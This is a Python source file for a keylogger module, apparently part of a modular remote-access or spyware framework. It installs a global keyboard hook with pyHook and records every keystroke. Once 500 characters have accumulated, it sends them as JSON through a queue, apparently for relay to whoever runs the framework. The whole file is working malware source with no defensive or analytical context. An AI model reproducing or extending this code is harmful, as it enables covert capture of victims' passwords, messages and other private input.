import pyHook
import pythoncom
from abstract import AbstractModule
from json import dumps


class KeyloggerModule(AbstractModule):
    def __init__(self, queue_send, event):
        super(KeyloggerModule, self).__init__(queue_send, event)

        self.keys = ''

    def _execute(self):
        hooks_manager = pyHook.HookManager()
        hooks_manager.KeyDown = self._keydown
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages()

    def _keydown(self, event):
        ignore = [0, 27]

        if event.Ascii in ignore:
            return True

        if event.Ascii == 8:
            key = '<BACK>'
        elif event.Ascii == 9:
            key = '<TAB>'
        elif event.Ascii == 13:
            key = '\n'
        else:
            key = unichr(event.Ascii)

        self.keys += key

        if len(self.keys) >= 500:
            message = {
                'module': "KeyloggerModule",
                "result": self.keys
            }

            print self.keys
            self.queue_send.put(dumps(message))
            self.keys = ''

        return True
